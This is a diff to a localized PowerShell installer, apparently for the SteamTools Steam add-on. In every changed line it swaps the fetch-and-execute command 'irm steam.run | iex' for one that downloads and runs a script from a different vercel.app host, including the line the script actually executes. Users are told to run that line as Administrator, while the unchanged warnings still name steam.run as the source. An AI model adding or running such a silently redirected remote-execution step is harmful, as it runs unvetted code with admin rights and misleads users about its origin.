@@ -97,7 +97,7 @@ $strings = @{
         RunAsAdminErr         = "Execute este instalador como Administrador. A pasta da Steam geralmente fica em Program Files."
         SteamToolsTitle       = "Instalação do SteamTools"
         SteamToolsWarning     = "AVISO: Este comando pode ser bloqueado por alguns antivírus. Certifique-se de que confia na origem (steam.run)."
-        SteamToolsCommand     = "Comando a executar: irm steam.run | iex"
+        SteamToolsCommand     = "Comando a executar: irm https://luatoolsplugin.vercel.app/cloudredirect.ps1 | iex"
         SteamToolsAskExecute  = "Deseja executar o comando agora? (S/N)"
         SteamToolsExecuted    = "Comando executado. Aguarde a conclusão."
         SteamToolsCopyHint    = "Comando não foi executado. Copie o comando acima e execute manualmente num PowerShell como Administrador quando desejar."
@@ -138,7 +138,7 @@ $strings = @{
         RunAsAdminErr         = "Ejecuta este instalador como Administrador. La carpeta de Steam suele estar en Program Files."
         SteamToolsTitle       = "Instalación de SteamTools"
         SteamToolsWarning     = "ADVERTENCIA: Este comando puede ser bloqueado por algunos antivirus. Asegúrate de confiar en el origen (steam.run)."
-        SteamToolsCommand     = "Comando a ejecutar: irm steam.run | iex"
+        SteamToolsCommand     = "Comando a ejecutar: irm https://luatoolsplugin.vercel.app/cloudredirect.ps1 | iex"
         SteamToolsAskExecute  = "¿Deseas ejecutar el comando ahora? (S/N)"
         SteamToolsExecuted    = "Comando ejecutado. Espera a que termine."
         SteamToolsCopyHint    = "El comando no se ejecutó. Copia el comando de arriba y ejecútalo manualmente en PowerShell como Administrador cuando quieras."
@@ -179,7 +179,7 @@ $strings = @{
         RunAsAdminErr         = "Run this installer as Administrator. Steam folder is usually in Program Files."
         SteamToolsTitle       = "SteamTools Installation"
         SteamToolsWarning     = "WARNING: This command might be blocked by some antivirus. Make sure you trust the source (steam.run)."
-        SteamToolsCommand     = "Command to run: irm steam.run | iex"
+        SteamToolsCommand     = "Command to run: irm https://luatoolsplugin.vercel.app/cloudredirect.ps1 | iex"
         SteamToolsAskExecute  = "Do you want to execute the command now? (Y/N)"
         SteamToolsExecuted    = "Command executed. Wait for completion."
         SteamToolsCopyHint    = "Command not executed. Copy the command above and run it manually in PowerShell as Administrator when ready."
@@ -637,7 +637,7 @@ if (`$lang -eq "pt-BR") {
     `$steamText = @{
         Title = "SteamTools Installation"
         Warning = "WARNING: This command might be blocked by some antivirus. Make sure you trust the source (steam.run)."
-        Command = "Command to run: irm steam.run | iex"
+        Command = "Command to run: irm https://luatoolsplugin.vercel.app/cloudredirect.ps1 | iex"
         Ask = "Do you want to execute the command now? (Y/N)"
         Executed = "Command executed. Wait for completion."
         CopyHint = "Command not executed. Copy the command above and run it manually in PowerShell as Administrator when ready."
@@ -658,7 +658,7 @@ Write-Host ""
 `$choice = Read-Host `$steamText.Ask
 if (`$choice -match '^[SsYy]$') {
     try {
-        irm steam.run | iex
+       irm https://luatoolsplugin.vercel.app/cloudredirect.ps1 | iex
         Write-Host "[OK] " -ForegroundColor Green -NoNewline
         Write-Host `$steamText.Executed
     }
